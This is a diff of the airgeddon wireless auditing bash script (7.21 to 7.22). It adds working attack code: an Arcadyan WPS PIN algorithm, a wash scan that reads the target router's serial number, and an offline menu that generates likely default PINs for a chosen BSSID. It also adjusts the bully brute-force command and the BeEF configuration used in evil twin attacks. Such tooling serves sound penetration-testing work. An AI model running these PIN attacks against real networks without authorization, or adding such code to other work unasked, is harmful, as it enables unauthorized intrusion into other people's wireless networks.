@@ -2,8 +2,8 @@
 #Title........: airgeddon.sh
 #Description..: This is a multi-use bash script for Linux systems to audit wireless networks.
 #Author.......: v1s1t0r
-#Date.........: 20170916
-#Version......: 7.21
+#Date.........: 20171004
+#Version......: 7.22
 #Usage........: bash airgeddon.sh
 #Bash Version.: 4.2 or later
 
@@ -110,8 +110,8 @@ declare -A possible_alias_names=(
 								)
 
 #General vars
-airgeddon_version="7.21"
-language_strings_expected_version="7.21-1"
+airgeddon_version="7.22"
+language_strings_expected_version="7.22-1"
 standardhandshake_filename="handshake-01.cap"
 tmpdir="/tmp/"
 osversionfile_dir="/etc/"
@@ -201,6 +201,7 @@ sslstrip_port="10000"
 bettercap_proxy_port="8080"
 bettercap_dns_port="5300"
 minimum_bettercap_advanced_options="1.5.9"
+minimum_bettercap_fixed_beef_iptables_issue="1.6.2"
 sslstrip_file="ag.sslstrip.log"
 ettercap_file="ag.ettercap.log"
 bettercap_file="ag.bettercap.log"
@@ -280,7 +281,7 @@ declare option_hints=(445 250 448 477)
 declare evil_twin_hints=(254 258 264 269 309 328 400)
 declare evil_twin_dos_hints=(267 268)
 declare beef_hints=(408)
-declare wps_hints=(342 343 344 356 369 390)
+declare wps_hints=(342 343 344 356 369 390 490)
 declare wep_hints=(431 429 428 432 433)
 
 #Charset vars
@@ -859,7 +860,46 @@ function set_wps_mac_parameters() {
 	four_wpsbssid_last_digits_clean=${four_wpsbssid_last_digits//:}
 }
 
-#Calculate pin based on Zhao Chunsheng algorithm (computepin), step 1
+#Check if wash has json option
+function check_json_option_on_wash() {
+
+	debug_print
+
+	wash 2>&1 | grep "\-j" > /dev/null
+	return $?
+}
+
+#Perform wash scan using -j (json) option to gather needed data
+function wash_json_scan() {
+
+	debug_print
+
+	tmpfiles_toclean=1
+	rm -rf "${tmpdir}wps_json_data.txt" > /dev/null 2>&1
+	rm -rf "${tmpdir}wps_fifo" > /dev/null 2>&1
+
+	mkfifo "${tmpdir}wps_fifo"
+	timeout -s SIGTERM 240 wash -i "${interface}" --scan -n 100 -j 2> /dev/null > "${tmpdir}wps_fifo" &
+	wash_json_pid=$!
+	tee "${tmpdir}wps_json_data.txt"< <(cat < "${tmpdir}wps_fifo") > /dev/null 2>&1 &
+
+	while true; do
+		sleep 5
+		wash_json_capture_alive=$(ps uax | awk '{print $2}' | grep -E "^${wash_json_pid}$" 2> /dev/null)
+		if [ -z "${wash_json_capture_alive}" ]; then
+			break
+		fi
+
+		if grep "${1}" "${tmpdir}wps_json_data.txt" > /dev/null; then
+			serial=$(grep "${1}" "${tmpdir}wps_json_data.txt" | awk -F '"wps_serial" : "' '{print $2}' | awk -F '"' '{print $1}' | sed 's/.*\(....\)/\1/' 2> /dev/null)
+			kill "${wash_json_capture_alive}" &> /dev/null
+			wait "${wash_json_capture_alive}" 2>/dev/null
+			break
+		fi
+	done
+}
+
+#Calculate pin based on Zhao Chunsheng algorithm (ComputePIN), step 1
 function calculate_computepin_algorithm_step1() {
 
 	debug_print
@@ -868,7 +908,7 @@ function calculate_computepin_algorithm_step1() {
 	computepin_pin=$((hex_to_dec % 10000000))
 }
 
-#Calculate pin based on Zhao Chunsheng algorithm (computepin), step 2
+#Calculate pin based on Zhao Chunsheng algorithm (ComputePIN), step 2
 function calculate_computepin_algorithm_step2() {
 
 	debug_print
@@ -876,7 +916,7 @@ function calculate_computepin_algorithm_step2() {
 	computepin_pin=$(printf '%08d\n' $((10#${computepin_pin} * 10 + checksum_digit)))
 }
 
-#Calculate pin based on Stefan Viehböck algorithm (easybox)
+#Calculate pin based on Stefan Viehböck algorithm (EasyBox)
 function calculate_easybox_algorithm() {
 
 	debug_print
@@ -898,6 +938,33 @@ function calculate_easybox_algorithm() {
 	Z2=$((0x${hexi[3]} ^ hex_to_dec[2]))
 
 	easybox_pin=$(printf '%08d\n' "$((0x$X1$X2$Y1$Y2$Z1$Z2$X3))" | awk '{for(i=length; i!=0; i--) x=x substr($0, i, 1);} END {print x}' | cut -c -7 | awk '{for(i=length; i!=0; i--) x=x substr($0, i, 1);} END {print x}')
+}
+
+#Calculate pin based on Arcadyan algorithm
+function calculate_arcadyan_algorithm() {
+
+	debug_print
+
+	local wan=""
+	if [ "${four_wpsbssid_last_digits_clean}" = "0000" ]; then
+		wan="fffe"
+	elif [ "${four_wpsbssid_last_digits_clean}" = "0001" ]; then
+		wan="ffff"
+	else
+		wan=$(printf "%04x" $((0x${four_wpsbssid_last_digits_clean} - 2)))
+	fi
+
+	K1=$(printf "%X\n" $(($((0x${serial:0:1} + 0x${serial:1:1} + 0x${wan:2:1} + 0x${wan:3:1})) % 16)))
+	K2=$(printf "%X\n" $(($((0x${serial:2:1} + 0x${serial:3:1} + 0x${wan:0:1} + 0x${wan:1:1})) % 16)))
+	D1=$(printf "%X\n" $((0x$K1 ^ 0x${serial:3:1})))
+	D2=$(printf "%X\n" $((0x$K1 ^ 0x${serial:2:1})))
+	D3=$(printf "%X\n" $((0x$K2 ^ 0x${wan:1:1})))
+	D4=$(printf "%X\n" $((0x$K2 ^ 0x${wan:2:1})))
+	D5=$(printf "%X\n" $((0x${serial:3:1} ^ 0x${wan:2:1})))
+	D6=$(printf "%X\n" $((0x${serial:2:1} ^ 0x${wan:3:1})))
+	D7=$(printf "%X\n" $((0x$K1 ^ 0x${serial:1:1})))
+
+	arcadyan_pin=$(printf '%07d\n' $(($(printf '%d\n' "0x$D1$D2$D3$D4$D5$D6$D7") % 10000000)))
 }
 
 #Calculate the last digit on pin following the checksum rule
@@ -930,18 +997,84 @@ function check_and_set_common_algorithms() {
 	language_strings "${language}" 388 "blue"
 	declare -g calculated_pins=("${wps_default_generic_pin}")
 
-	calculate_computepin_algorithm_step1
-	pin_checksum_rule "${computepin_pin}"
-	calculate_computepin_algorithm_step2
-	calculated_pins+=("${computepin_pin}")
+	if ! check_if_type_exists_in_wps_data_array "${wps_bssid}" "ComputePIN"; then
+		calculate_computepin_algorithm_step1
+		pin_checksum_rule "${computepin_pin}"
+		calculate_computepin_algorithm_step2
+		calculated_pins+=("${computepin_pin}")
+		fill_wps_data_array "${wps_bssid}" "ComputePIN" "${computepin_pin}"
+	else
+		calculated_pins+=("${wps_data_array["${wps_bssid}",'ComputePIN']}")
+	fi
 
-	calculate_easybox_algorithm
-	pin_checksum_rule "${easybox_pin}"
-	easybox_pin=$(printf '%08d\n' $((current_calculated_pin + checksum_digit)))
-	calculated_pins+=("${easybox_pin}")
+	if ! check_if_type_exists_in_wps_data_array "${wps_bssid}" "EasyBox"; then
+		calculate_easybox_algorithm
+		pin_checksum_rule "${easybox_pin}"
+		easybox_pin=$(printf '%08d\n' $((current_calculated_pin + checksum_digit)))
+		calculated_pins+=("${easybox_pin}")
+		fill_wps_data_array "${wps_bssid}" "EasyBox" "${easybox_pin}"
+	else
+		calculated_pins+=("${wps_data_array["${wps_bssid}",'EasyBox']}")
+	fi
+
+	if ! check_if_type_exists_in_wps_data_array "${wps_bssid}" "Arcadyan"; then
+
+		able_to_check_json_option_on_wash=0
+		if [ "${wps_attack}" = "pindb_bully" ]; then
+			if hash wash 2> /dev/null; then
+				able_to_check_json_option_on_wash=1
+			else
+				echo
+				language_strings "${language}" 492 "yellow"
+				echo
+			fi
+		elif [ "${wps_attack}" = "pindb_reaver" ]; then
+			able_to_check_json_option_on_wash=1
+		fi
+
+		if [ "${able_to_check_json_option_on_wash}" -eq 1 ]; then
+			if check_json_option_on_wash; then
+				ask_yesno 485 "no"
+				if [ "${yesno}" = "y" ]; then
+					echo
+					language_strings "${language}" 489 "blue"
+
+					serial=""
+					wash_json_scan "${wps_bssid}"
+
+					if [ -n "${serial}" ]; then
+						if [[ "${serial}" =~ ^[0-9]{4}$ ]]; then
+							calculate_arcadyan_algorithm
+							pin_checksum_rule "${arcadyan_pin}"
+							arcadyan_pin="${arcadyan_pin}${checksum_digit}"
+							calculated_pins=("${arcadyan_pin}" "${calculated_pins[@]}")
+							fill_wps_data_array "${wps_bssid}" "Arcadyan" "${arcadyan_pin}"
+							echo
+							language_strings "${language}" 487 "yellow"
+						else
+							echo
+							language_strings "${language}" 491 "yellow"
+						fi
+						echo
+					else
+						echo
+						language_strings "${language}" 488 "yellow"
+						echo
+					fi
+				fi
+			else
+				echo
+				language_strings "${language}" 486 "yellow"
+			fi
+		fi
+	else
+		echo
+		calculated_pins=("${wps_data_array["${wps_bssid}",'Arcadyan']}" "${calculated_pins[@]}")
+		language_strings "${language}" 493 "yellow"
+		echo
+	fi
 
 	if integrate_algorithms_pins; then
-		echo
 		language_strings "${language}" 389 "yellow"
 	fi
 }
@@ -952,17 +1085,17 @@ function integrate_algorithms_pins() {
 	debug_print
 
 	some_calculated_pin_included=0
-	for pin in "${calculated_pins[@]}"; do
+	for ((idx=${#calculated_pins[@]}-1; idx>=0; idx--)) ; do
 		this_pin_already_included=0
 		for item in "${pins_found[@]}"; do
-			if [ "${item}" = "${pin}" ]; then
+			if [ "${item}" = "${calculated_pins[idx]}" ]; then
 				this_pin_already_included=1
 				break
 			fi
 		done
 
 		if [ ${this_pin_already_included} -eq 0 ]; then
-			pins_found+=(${pin})
+			pins_found=("${calculated_pins[idx]}" "${pins_found[@]}")
 			counter_pins_found=$((counter_pins_found + 1))
 			some_calculated_pin_included=1
 		fi
@@ -971,6 +1104,7 @@ function integrate_algorithms_pins() {
 	if [ "${some_calculated_pin_included}" -eq 1 ]; then
 		return 0
 	fi
+
 	return 1
 }
 
@@ -989,6 +1123,7 @@ function search_in_pin_database() {
 			for item2 in "${arrpins[@]}"; do
 				counter_pins_found=$((counter_pins_found+1))
 				pins_found+=(${item2})
+				fill_wps_data_array "${wps_bssid}" "Database" "${item2}"
 			done
 			break
 		fi
@@ -2851,30 +2986,34 @@ function wps_attacks_parameters() {
 
 	debug_print
 
-	if ! check_monitor_enabled; then
-		return 1
-	fi
+	if [ "${1}" != "no_monitor_check" ]; then
+		if ! check_monitor_enabled; then
+			return 1
+		fi
 
-	echo
-	language_strings "${language}" 34 "yellow"
+		echo
+		language_strings "${language}" 34 "yellow"
+	fi
 
 	if ! ask_bssid "wps"; then
 		return 1
 	fi
 	ask_channel "wps"
 
-	case ${wps_attack} in
-		"custompin_bully"|"custompin_reaver")
-			ask_custom_pin
-			ask_wps_timeout "standard"
-		;;
-		"pixiedust_bully"|"pixiedust_reaver")
-			ask_wps_timeout "pixiedust"
-		;;
-		"pindb_bully"|"pindb_reaver")
-			ask_wps_timeout "standard"
-		;;
-	esac
+	if [ "${1}" != "no_monitor_check" ]; then
+		case ${wps_attack} in
+			"custompin_bully"|"custompin_reaver")
+				ask_custom_pin
+				ask_wps_timeout "standard"
+			;;
+			"pixiedust_bully"|"pixiedust_reaver")
+				ask_wps_timeout "pixiedust"
+			;;
+			"pindb_bully"|"pindb_reaver")
+				ask_wps_timeout "standard"
+			;;
+		esac
+	fi
 
 	return 0
 }
@@ -3199,6 +3338,10 @@ function initialize_menu_and_print_selections() {
 			print_iface_selected
 			print_all_target_vars_wps
 		;;
+		"offline_pin_generation_menu")
+			print_iface_selected
+			print_all_target_vars_wps
+		;;
 		"wep_attacks_menu")
 			print_iface_selected
 			print_all_target_vars
@@ -3400,7 +3543,7 @@ function print_hint() {
 			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
 			strtoprint=${hints[evil_twin_dos_hints|${randomhint}]}
 		;;
-		"wps_attacks_menu")
+		"wps_attacks_menu"|"offline_pin_generation_menu")
 			store_array hints wps_hints "${wps_hints[@]}"
 			hintlength=${#wps_hints[@]}
 			((hintlength--))
@@ -3719,6 +3862,8 @@ function wps_attacks_menu() {
 	language_strings "${language}" 348 bully_attacks_dependencies[@]
 	language_strings "${language}" 360 reaver_attacks_dependencies[@]
 	print_simple_separator
+	language_strings "${language}" 494
+	print_simple_separator
 	language_strings "${language}" 361
 	print_hint ${current_menu}
 
@@ -3887,6 +4032,9 @@ function wps_attacks_menu() {
 			fi
 		;;
 		13)
+			offline_pin_generation_menu
+		;;
+		14)
 			return
 		;;
 		*)
@@ -3895,6 +4043,187 @@ function wps_attacks_menu() {
 	esac
 
 	wps_attacks_menu
+}
+
+#Offline pin generation menu
+function offline_pin_generation_menu() {
+
+	debug_print
+
+	clear
+	language_strings "${language}" 495 "title"
+	current_menu="offline_pin_generation_menu"
+	initialize_menu_and_print_selections
+	echo
+	language_strings "${language}" 47 "green"
+	print_simple_separator
+	language_strings "${language}" 48
+	language_strings "${language}" 55
+	language_strings "${language}" 56
+	language_strings "${language}" 49 wash_scan_dependencies[@]
+	language_strings "${language}" 498 "separator"
+	language_strings "${language}" 496
+	echo "6.  ComputePIN"
+	echo "7.  EasyBox"
+	echo "8.  Arcadyan"
+	print_simple_separator
+	language_strings "${language}" 497
+	print_hint ${current_menu}
+
+	read -r offline_pin_generation_option
+	case ${offline_pin_generation_option} in
+		1)
+			select_interface
+		;;
+		2)
+			monitor_option
+		;;
+		3)
+			managed_option
+		;;
+		4)
+			if contains_element "${wps_option}" "${forbidden_options[@]}"; then
+				forbidden_menu_option
+			else
+				explore_for_wps_targets_option
+			fi
+		;;
+		5)
+			db_error=0
+			if [[ ${pin_dbfile_checked} -eq 0 ]] || [[ ! -f "${scriptfolder}${known_pins_dbfile}" ]]; then
+				if check_pins_database_file; then
+					echo
+					language_strings "${language}" 373 "blue"
+				else
+					echo
+					language_strings "${language}" 372 "red"
+					db_error=1
+				fi
+			else
+				echo
+				language_strings "${language}" 379 "blue"
+			fi
+			language_strings "${language}" 115 "read"
+
+			if [ "${db_error}" -eq 0 ]; then
+				if wps_attacks_parameters "no_monitor_check"; then
+					wps_pin_database_prerequisites "no_attack"
+					if [ ${bssid_found_in_db} -eq 1 ]; then
+						echo
+						language_strings "${language}" 499 "blue"
+						echo "${wps_data_array["${wps_bssid}",'Database']}"
+						echo
+					fi
+					language_strings "${language}" 115 "read"
+				fi
+			fi
+		;;
+		6)
+			if wps_attacks_parameters "no_monitor_check"; then
+				if ! check_if_type_exists_in_wps_data_array "${wps_bssid}" "ComputePIN"; then
+					set_wps_mac_parameters
+					calculate_computepin_algorithm_step1
+					pin_checksum_rule "${computepin_pin}"
+					calculate_computepin_algorithm_step2
+					fill_wps_data_array "${wps_bssid}" "ComputePIN" "${computepin_pin}"
+				fi
+
+				echo
+				language_strings "${language}" 500 "blue"
+				echo "${wps_data_array["${wps_bssid}",'ComputePIN']}"
+				echo
+				language_strings "${language}" 115 "read"
+			fi
+		;;
+		7)
+			if wps_attacks_parameters "no_monitor_check"; then
+				if ! check_if_type_exists_in_wps_data_array "${wps_bssid}" "EasyBox"; then
+					set_wps_mac_parameters
+					calculate_easybox_algorithm
+					pin_checksum_rule "${easybox_pin}"
+					easybox_pin=$(printf '%08d\n' $((current_calculated_pin + checksum_digit)))
+					fill_wps_data_array "${wps_bssid}" "EasyBox" "${easybox_pin}"
+				fi
+
+				echo
+				language_strings "${language}" 501 "blue"
+				echo "${wps_data_array["${wps_bssid}",'EasyBox']}"
+				echo
+				language_strings "${language}" 115 "read"
+			fi
+		;;
+		8)
+			if wps_attacks_parameters "no_monitor_check"; then
+				offline_arcadyan_pin_can_be_shown=0
+				if ! check_if_type_exists_in_wps_data_array "${wps_bssid}" "Arcadyan"; then
+
+					ask_yesno 504 "yes"
+					if [ "${yesno}" = "y" ]; then
+
+						if check_monitor_enabled; then
+							able_to_check_json_option_on_wash=0
+							if hash wash 2> /dev/null; then
+								able_to_check_json_option_on_wash=1
+								if [ "${able_to_check_json_option_on_wash}" -eq 1 ]; then
+									if check_json_option_on_wash; then
+
+										echo
+										language_strings "${language}" 489 "blue"
+
+										serial=""
+										wash_json_scan "${wps_bssid}"
+										if [ -n "${serial}" ]; then
+											if [[ "${serial}" =~ ^[0-9]{4}$ ]]; then
+												set_wps_mac_parameters
+												calculate_arcadyan_algorithm
+												pin_checksum_rule "${arcadyan_pin}"
+												arcadyan_pin="${arcadyan_pin}${checksum_digit}"
+												fill_wps_data_array "${wps_bssid}" "Arcadyan" "${arcadyan_pin}"
+												offline_arcadyan_pin_can_be_shown=1
+											else
+												echo
+												language_strings "${language}" 491 "yellow"
+											fi
+											echo
+										else
+											echo
+											language_strings "${language}" 488 "red"
+											language_strings "${language}" 115 "read"
+										fi
+									fi
+								fi
+							else
+								echo
+								language_strings "${language}" 486 "red"
+								language_strings "${language}" 115 "read"
+							fi
+						fi
+					fi
+				else
+					echo
+					language_strings "${language}" 503 "yellow"
+					language_strings "${language}" 115 "read"
+					offline_arcadyan_pin_can_be_shown=1
+				fi
+
+				if [ "${offline_arcadyan_pin_can_be_shown}" -eq 1 ]; then
+					echo
+					language_strings "${language}" 502 "blue"
+					echo "${wps_data_array["${wps_bssid}",'Arcadyan']}"
+					echo
+					language_strings "${language}" 115 "read"
+				fi
+			fi
+		;;
+		9)
+			return
+		;;
+		*)
+			invalid_menu_option
+		;;
+	esac
+
+	offline_pin_generation_menu
 }
 
 #WEP attacks menu
@@ -5333,7 +5662,7 @@ function set_wps_attack_script() {
 				attack_cmd1="bully \${script_interface} -b \${script_wps_bssid} -c \${script_wps_channel} -d -v ${bully_verbosity}"
 			;;
 			"bruteforce")
-				attack_cmd1="bully \${script_interface} -b \${script_wps_bssid} -c \${script_wps_channel} -L -F -B -v ${bully_verbosity}"
+				attack_cmd1="bully \${script_interface} -b \${script_wps_bssid} -c \${script_wps_channel} -S -L -F -B -v ${bully_verbosity}"
 			;;
 		esac
 	fi
@@ -6226,6 +6555,12 @@ function set_beef_config() {
 		beef_db_path="${beef_db}"
 	fi
 
+	if compare_floats_greater_or_equal "${bettercap_version}" "${minimum_bettercap_fixed_beef_iptables_issue}"; then
+		beef_panel_restriction="        permitted_ui_subnet: \"127.0.0.1/32\""
+	else
+		beef_panel_restriction="        permitted_ui_subnet: \"0.0.0.0/0\""
+	fi
+
 	{
 	echo -e "beef:"
 	echo -e "    version: 'airgeddon integrated'"
@@ -6234,10 +6569,7 @@ function set_beef_config() {
 	echo -e "    crypto_default_value_length: 80"
 	echo -e "    restrictions:"
 	echo -e "        permitted_hooking_subnet: \"${et_ip_range}/24\""
-	echo -e "        permitted_ui_subnet: \"0.0.0.0/0\""
-	#TODO: This should be permitted_ui_subnet: "127.0.0.1/32" but is not possible to use it with bettercap's proxy because of a bug
-	#https://github.com/evilsocket/bettercap/issues/356
-	#https://github.com/beefproject/beef/issues/1337
+	echo -e "${beef_panel_restriction}"
 	echo -e "    http:"
 	echo -e "        debug: false"
 	echo -e "        host: \"0.0.0.0\""
@@ -7660,6 +7992,41 @@ function set_wash_parameterization() {
 	wash_ifaces_already_set[${interface}]=${fcs}
 }
 
+#Check if a type exists in the wps data array
+function check_if_type_exists_in_wps_data_array() {
+
+	debug_print
+
+	[[ -n "${wps_data_array["${1}","${2}"]:+not set}" ]]
+}
+
+#Check if a pin exists in the wps data array
+function check_if_pin_exists_in_wps_data_array() {
+
+	debug_print
+
+	[[ "${wps_data_array["${1}","${2}"]}" =~ (^| )"${3}"( |$) ]]
+}
+
+#Fill data into wps data array
+function fill_wps_data_array() {
+
+	debug_print
+
+	if ! check_if_pin_exists_in_wps_data_array "${1}" "${2}" "${3}"; then
+
+		if [ "${2}" != "Database" ]; then
+			wps_data_array["${1}","${2}"]="${3}"
+		else
+			if [ "${wps_data_array["${1}","${2}"]}" = "" ]; then
+				wps_data_array["${1}","${2}"]="${3}"
+			else
+				wps_data_array["${1}","${2}"]="${wps_data_array["${1}","${2}"]} ${3}"
+			fi
+		fi
+	fi
+}
+
 #Manage and validate the prerequisites for wps pin database attacks
 function wps_pin_database_prerequisites() {
 
@@ -7684,10 +8051,12 @@ function wps_pin_database_prerequisites() {
 		language_strings "${language}" 387 "yellow"
 	fi
 
-	check_and_set_common_algorithms
-	echo
-	language_strings "${language}" 366 "blue"
-	language_strings "${language}" 4 "read"
+	if [ "${1}" != "no_attack" ]; then
+		check_and_set_common_algorithms
+		echo
+		language_strings "${language}" 366 "blue"
+		language_strings "${language}" 4 "read"
+	fi
 }
 
 #Manage and validate the prerequisites for Evil Twin attacks
@@ -8690,7 +9059,7 @@ function detect_arm_architecture() {
 
 	distro_already_known=0
 
-	if uname -m | grep -i "arm" > /dev/null && "${distro}" != "Unknown Linux"; then
+	if uname -m | grep -i "arm" > /dev/null && [[ "${distro}" != "Unknown Linux" ]]; then
 
 		for item in "${known_arm_compatible_distros[@]}"; do
 			if [ "${distro}" = "${item}" ]; then
@@ -9202,6 +9571,7 @@ function initialize_script_settings() {
 	http_proxy_set=0
 	hccapx_needed=0
 	xterm_ok=1
+	declare -gA wps_data_array
 }
 
 #Detect if there is a working X window system
